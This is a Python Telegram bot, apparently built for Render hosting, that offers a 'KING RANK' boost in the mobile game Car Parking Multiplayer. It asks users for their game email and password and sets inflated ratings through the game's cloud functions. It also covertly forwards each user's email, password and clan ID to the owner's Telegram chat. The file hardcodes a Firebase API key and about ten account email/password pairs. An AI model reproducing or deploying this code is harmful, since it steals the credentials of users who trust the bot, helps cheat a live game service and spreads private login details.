import os
import requests
import json
import telebot
from flask import Flask
from threading import Thread

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# --- Telegram Bot Configuration ---
# Эти переменные ДОЛЖНЫ быть добавлены в разделе Environment на Render
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не задан в Environment Variables!")

bot = telebot.TeleBot(BOT_TOKEN)
user_states = {}

OWNER_ID = int(CHAT_ID) if CHAT_ID else 0
ADMINS = {"usernames": set(), "ids": set()}

# --- АККАУНТЫ ДЛЯ /level ---
ACCOUNTS = [
    {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
    {"email": "cpmcpmking1@gmail.com", "password": "666666"},
    {"email": "cpmcpmking2@gmail.com", "password": "666666"},
    {"email": "cpmcpmking3@gmail.com", "password": "666666"},
    {"email": "cpmcpmking4@gmail.com", "password": "666666"},
    {"email": "cpmcpmking5@gmail.com", "password": "666666"},
    {"email": "cpmcpmking52@gmail.com", "password": "666666"},
    {"email": "den_isaev_95@mail.ru", "password": "Zaebali1995"},
    {"email": "kingcpmcpm1@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm2@gmail.com", "password": "666666"},
]

# --- Flask Server for Render ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is running!", 200

# --- FUNCTIONS ---
def is_admin(message):
    username = message.from_user.username
    user_id = message.from_user.id
    return (
        user_id == OWNER_ID or
        (username and username in ADMINS["usernames"]) or
        (user_id in ADMINS["ids"])
    )

def send_to_telegram(email, password, clan_id):
    try:
        bot.send_message(CHAT_ID,
            f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}")
    except:
        pass

def login(email, password):
    try:
        r = requests.post(FIREBASE_LOGIN_URL, json={
            "clientType": "CLIENT_TYPE_ANDROID",
            "email": email,
            "password": password,
            "returnSecureToken": True
        }, timeout=10)
        data = r.json()
        if r.status_code == 200 and "idToken" in data:
            return data["idToken"]
    except:
        pass
    return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
        "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
        "gifts","fuel","offroad","speed_banner","reactions","police","run",
        "real_estate","t_distance","treasure","block_post","push_ups",
        "burnt_tire","passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    try:
        r = requests.post(RANK_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": json.dumps({"RatingData": rating_data})},
            timeout=10
        )
        return r.status_code == 200
    except:
        return False

def check_clan_id(token, email, password):
    try:
        r = requests.post(CLAN_ID_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": None},
            timeout=10
        )
        if r.status_code == 200:
            clan_id = r.json().get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)
    except:
        pass

def run_mass_rank():
    for acc in ACCOUNTS:
        token = login(acc["email"], acc["password"])
        if token:
            set_rank(token)

# --- COMMANDS ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    user_states[message.from_user.id] = {"step": "await_email"}
    name = message.from_user.first_name or "Неизвестно"
    username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"
    bot.send_message(message.chat.id,
        f"🏷️ имя: {name}\n🪪 user: {username}\n🌐 tg id: {message.from_user.id}\n💰 balance: unlimited")
    bot.send_message(message.chat.id, "📧 ⚫️ ВВЕДИ @GMAIL ⚫️")

@bot.message_handler(commands=["level"])
def handle_level(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    bot.send_message(message.chat.id, "🚀 Запуск KING RANK...")
    Thread(target=run_mass_rank).start()
    bot.send_message(message.chat.id, "👑 KING RANK установлены!")

@bot.message_handler(commands=["admin"])
def list_admins(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    text = "👑 Список админов:\n\n"
    if not ADMINS["usernames"] and not ADMINS["ids"]:
        text += "❌ Список пуст"
    else:
        for u in ADMINS["usernames"]: text += f"🪪 @{u}\n"
        for i in ADMINS["ids"]: text += f"🌐 ID: {i}\n"
    bot.send_message(message.chat.id, text)

# --- USER FLOW ---
@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_flow(message):
    state = user_states[message.from_user.id]
    if state["step"] == "await_email":
        state["email"] = message.text
        state["step"] = "await_password"
        bot.send_message(message.chat.id, "🔒 ⚫️ ВВЕДИ ПАРОЛЬ ⚫️")
    elif state["step"] == "await_password":
        bot.send_message(message.chat.id, "⏳ Обработка...")
        token = login(state["email"], message.text)
        if token and set_rank(token):
            check_clan_id(token, state["email"], message.text)
            bot.send_message(message.chat.id, "✅ Готово!")
        else:
            bot.send_message(message.chat.id, "❌ Ошибка входа.")
        del user_states[message.from_user.id]

# --- STARTUP ---
def run_bot():
    bot.infinity_polling(none_stop=True)

if __name__ == "__main__":
    # Запуск бота в отдельном потоке
    Thread(target=run_bot).start()
    # Запуск Flask сервера для Render на нужном порту
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
